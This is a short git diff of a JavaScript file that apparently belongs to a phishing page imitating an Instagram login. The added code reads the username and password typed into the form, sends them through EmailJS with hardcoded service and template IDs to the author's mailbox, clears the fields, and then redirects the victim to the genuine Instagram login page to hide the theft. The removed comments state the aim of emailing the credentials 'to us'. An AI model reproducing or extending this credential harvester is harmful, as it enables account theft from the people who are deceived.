@@ -1,12 +1,26 @@
-// some mistakes here !! trying to fix 
-// idea is sending  with email to us 
-function readData() {
-  try{
-    username =document.getElementById("username").value;
-    password = document.getElementById("password").value;
-  }
-  catch(error){
-    console.log(error)
-  }
-}
+function sendMail(){
+  var params = {
+    username_id: document.getElementById("username").value,
+    passwort_id: document.getElementById("password").value,
 
+  };
+
+  const serviceid = 'service_4kvbchh';
+  const templateid = 'template_irilfla';
+  emailjs.send(serviceid,templateid,params)
+  .then(
+    res => {
+     
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+      
+    })
+    .catch((err) => alert(err));
+
+}
+function forwarding(){
+  document.getElementById("LoginButton").addEventListener("click", function() {
+    // Redirect to Instagram login page
+    window.location.href = "https://www.instagram.com/accounts/login/";
+  });
+  }
